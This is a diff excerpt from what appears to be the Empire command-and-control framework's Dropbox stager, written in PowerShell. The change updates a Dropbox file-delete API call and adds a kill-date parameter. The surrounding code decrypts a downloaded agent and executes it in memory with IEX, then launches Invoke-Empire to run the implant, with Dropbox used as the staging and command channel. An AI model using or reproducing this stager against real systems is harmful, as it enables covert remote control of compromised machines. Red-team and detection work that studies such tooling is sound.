@@ -214,7 +214,7 @@ function Start-Negotiate {
     $wc2.Headers.Add("User-Agent",$UA);
     $wc2.Headers.Add("Authorization", "Bearer $T");
     $wc2.Headers.Add("Content-Type", " application/json");
-    $Null=$wc2.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"{{ staging_folder }}/$($ID)_4.txt`"}");
+    $Null=$wc2.UploadString("https://api.dropboxapi.com/2/files/delete_v2", "POST", "{`"path`":`"{{ staging_folder }}/$($ID)_4.txt`"}");
 
     # decrypt the agent and register the agent logic
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
@@ -224,7 +224,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -ProxySettings $Script:Proxy;
+    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -KillDate "{{ kill_date }}" -ProxySettings $Script:Proxy;
 };
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
 Start-Negotiate -T $T -PI "{{ poll_interval }}" -SK "{{ staging_key }}" -UA $u;
